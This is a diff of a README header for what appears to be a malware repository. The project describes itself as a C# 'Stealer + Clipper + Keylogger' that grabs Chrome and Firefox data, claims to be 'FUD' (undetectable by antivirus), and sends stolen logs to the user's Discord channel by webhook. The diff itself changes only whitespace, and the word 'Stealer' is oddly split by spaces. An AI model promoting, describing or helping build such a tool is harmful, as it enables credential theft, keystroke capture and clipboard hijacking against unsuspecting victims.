@@ -1,4 +1,4 @@
-<p align="center">                                                                                                                                                                                                                                                                                                                                 
+<p align="center">                                                                                                                                                                                                                                                                                                                                    
   <   b>Ste            aler + Clipper + Keylogger - MODED Version 30.12.2023 Fix Chrome, Firefox grabber FUD</b> <br>
   <i>Stealer written on C#, logs will be sent to your Discord channel using a webhook.</i>
   <img src="https://user-images.githubusercontent.com/73314940/227033966-765bde5a-438d-4b97-844b-f70c67ac6352.jpg"> <br>
